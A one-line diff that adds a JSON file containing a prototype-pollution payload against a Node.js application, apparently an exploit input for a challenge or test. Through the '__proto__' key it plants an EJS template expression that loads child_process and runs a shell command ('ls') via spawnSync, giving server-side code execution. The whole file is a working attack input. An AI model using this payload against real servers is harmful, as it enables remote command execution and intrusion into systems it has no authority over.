@@ -1,0 +1,1 @@
+{"cryptos": ["koin"], "options": {"__proto__": {"status": 555, "555": "<%= process.mainModule.require(\"child_process\").spawnSync(\"ls\").stdout.toString() %>", "koin": true}}}
